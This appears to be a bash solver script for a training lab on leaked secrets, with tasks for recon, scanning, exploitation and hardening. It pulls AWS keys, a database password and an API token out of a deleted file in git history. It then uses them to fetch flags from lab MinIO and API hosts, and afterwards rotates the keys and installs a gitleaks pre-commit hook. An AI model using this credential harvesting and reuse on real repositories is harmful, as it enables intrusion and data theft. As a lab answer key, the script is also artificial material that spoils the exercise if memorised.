#!/bin/bash
set -u

REPO="$HOME/repo"
SENSITIVE_PATH="deploy/credentials.yaml"
FAIL=0

note() { echo; echo "===== $* ====="; }
ok()   { echo "  [OK] $*"; }
bad()  { echo "  [FAIL] $*"; FAIL=1; }

note "Task 1 - recon_history"
if [ ! -d "$REPO/.git" ]; then
  bad "$REPO not found - the lab has not built the repo (did fixlocal.sh run?)."
  exit 1
fi

ADD_COMMIT=$(git -C "$REPO" log --all --diff-filter=A --format='%H' -- "$SENSITIVE_PATH" | tail -n1)
REMOVE_COMMIT=$(git -C "$REPO" log --all --diff-filter=D --format='%H' -- "$SENSITIVE_PATH" | tail -n1)

if [ -n "$ADD_COMMIT" ] && [ -n "$REMOVE_COMMIT" ]; then
  cat > "$HOME/recon_answers.txt" <<EOF
ADD_COMMIT=$ADD_COMMIT
REMOVE_COMMIT=$REMOVE_COMMIT
EOF
  ok "Found ADD_COMMIT=$ADD_COMMIT REMOVE_COMMIT=$REMOVE_COMMIT -> ~/recon_answers.txt"
else
  bad "Cannot identify the commits that added/removed $SENSITIVE_PATH"
fi

if git -C "$REPO" show "HEAD:$SENSITIVE_PATH" >/dev/null 2>&1; then
  bad "HEAD still contains $SENSITIVE_PATH - sample repo is not as expected"
else
  ok "Current HEAD no longer contains $SENSITIVE_PATH (as expected)"
fi

note "Task 2 - scan_secrets"
if command -v gitleaks >/dev/null 2>&1; then
  gitleaks detect --source "$REPO" -v --report-path="$HOME/gitleaks.json" >/tmp/gitleaks_run.log 2>&1
  N=$(grep -c '"RuleID"' "$HOME/gitleaks.json" 2>/dev/null || echo 0)
  if [ "${N:-0}" -ge 2 ]; then
    ok "gitleaks.json has $N findings (>=2)"
  else
    bad "gitleaks.json has only $N findings (<2) - see /tmp/gitleaks_run.log"
  fi
else
  bad "gitleaks command not found"
fi

if [ -n "${ADD_COMMIT:-}" ]; then
  CONTENT=$(git -C "$REPO" show "$ADD_COMMIT:$SENSITIVE_PATH" 2>/dev/null)
  AWS_ACCESS_KEY_ID=$(echo "$CONTENT" | sed -n 's/^[[:space:]]*access_key_id:[[:space:]]*//p' | tr -d '\r')
  AWS_SECRET_ACCESS_KEY=$(echo "$CONTENT" | sed -n 's/^[[:space:]]*secret_access_key:[[:space:]]*//p' | tr -d '\r')
  DB_PASSWORD=$(echo "$CONTENT" | sed -n 's/^[[:space:]]*password:[[:space:]]*//p' | tr -d '\r')
  API_TOKEN=$(echo "$CONTENT" | sed -n 's/^[[:space:]]*token:[[:space:]]*//p' | tr -d '\r')

  cat > "$HOME/secrets_found.txt" <<EOF
AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
DB_PASSWORD=$DB_PASSWORD
API_TOKEN=$API_TOKEN
EOF
  if [ -n "$AWS_ACCESS_KEY_ID" ] && [ -n "$AWS_SECRET_ACCESS_KEY" ] && [ -n "$DB_PASSWORD" ] && [ -n "$API_TOKEN" ]; then
    ok "Extracted all 4 credentials -> ~/secrets_found.txt"
  else
    bad "One or more credential fields missing after extraction"
  fi
else
  bad "Skipping credential extraction: no ADD_COMMIT"
fi

note "Task 3 - exploit_get_flag"
if [ -n "${AWS_ACCESS_KEY_ID:-}" ] && [ -n "${AWS_SECRET_ACCESS_KEY:-}" ]; then
  mc alias set leak "http://storage:9000" "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" >/dev/null 2>&1
  if mc cat leak/corp-backups/flags/flag.txt > "$HOME/loot_storage.txt" 2>/tmp/mc_cat.log; then
    ok "Got flag from MinIO -> ~/loot_storage.txt ($(cat "$HOME/loot_storage.txt"))"
  else
    bad "Cannot read the flag object on MinIO - see /tmp/mc_cat.log"
  fi
else
  bad "Skipping path A (MinIO): AWS key missing"
fi

if [ -n "${API_TOKEN:-}" ]; then
  RESP=$(curl -sS --max-time 10 -H "Authorization: Bearer $API_TOKEN" http://app:8080/flag)
  FLAGVAL=$(echo "$RESP" | jq -r '.flag // empty' 2>/dev/null)
  if [ -n "$FLAGVAL" ]; then
    echo "$FLAGVAL" > "$HOME/loot_api.txt"
    ok "Got flag from app (Bearer token) -> ~/loot_api.txt ($FLAGVAL)"
  else
    bad "Cannot get flag from app with Bearer token. Response: $RESP"
  fi
else
  bad "Skipping path B (API): API_TOKEN missing"
fi

note "Task 4 - remediation_harden"
if [ -x "$HOME/rotate_secrets.sh" ]; then
  "$HOME/rotate_secrets.sh"
  if [ -f "$HOME/loot_rotate.txt" ]; then
    ok "rotate_secrets.sh succeeded -> ~/loot_rotate.txt ($(cat "$HOME/loot_rotate.txt"))"
  else
    bad "rotate_secrets.sh did not create ~/loot_rotate.txt"
  fi
else
  bad "~/rotate_secrets.sh not found (or not executable)"
fi

if [ -n "${AWS_ACCESS_KEY_ID:-}" ] && [ -n "${AWS_SECRET_ACCESS_KEY:-}" ]; then
  mc alias set leak "http://storage:9000" "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" >/dev/null 2>&1
  mc ls leak > "$HOME/rotate_verify.log" 2>&1
  if [ $? -eq 0 ]; then
    echo "RESULT=ALLOWED" >> "$HOME/rotate_verify.log"
    bad "Old AWS key STILL has access after rotate (expected denied)"
  else
    echo "RESULT=DENIED" >> "$HOME/rotate_verify.log"
    ok "Old AWS key denied after rotate (as expected) -> ~/rotate_verify.log"
  fi
fi

mkdir -p "$REPO"
echo 'APP_API_TOKEN=solver-demo-new-token' > "$REPO/.env"
echo 'AWS_ACCESS_KEY_ID=solver-demo-new-key' >> "$REPO/.env"

cd "$REPO" || exit 1
printf '%s\n' '.env' '*.env' 'config/secrets.*' 'deploy/credentials.yaml' >> .gitignore
if git status --porcelain | grep -q '\.env'; then
  bad ".env is still tracked by Git after updating .gitignore"
else
  ok ".gitignore ignores .env"
fi

cat > "$REPO/.git/hooks/pre-commit" <<'HOOK'
#!/bin/sh
gitleaks protect --staged -v || {
  echo "[BLOCKED] Secret detected in staged changes. Commit aborted."
  exit 1
}
HOOK
chmod +x "$REPO/.git/hooks/pre-commit"
if [ -x "$REPO/.git/hooks/pre-commit" ]; then
  ok "pre-commit hook installed and executable"
else
  bad "cannot chmod +x the pre-commit hook"
fi

echo 'aws_secret = "AKIAFAKE1234567890EX"' > "$REPO/test_leak.txt"
git -C "$REPO" add test_leak.txt
git -C "$REPO" commit -m "test" > "$HOME/precommit_test.log" 2>&1
if [ $? -ne 0 ]; then
  echo "RESULT=COMMIT_BLOCKED" >> "$HOME/precommit_test.log"
  ok "pre-commit hook blocked the test commit containing a secret"
else
  echo "RESULT=COMMIT_SUCCEEDED" >> "$HOME/precommit_test.log"
  bad "Test commit containing a secret was NOT blocked (hook not working)"
fi
git -C "$REPO" reset -q HEAD test_leak.txt 2>/dev/null
rm -f "$REPO/test_leak.txt"

note "Summary"
if [ "$FAIL" -eq 0 ]; then
  echo "ALL MAIN STEPS SUCCEEDED. Verify with checkwork/gradelab."
  exit 0
else
  echo "AT LEAST ONE STEP FAILED ABOVE - check the [FAIL] lines before grading."
  exit 1
fi
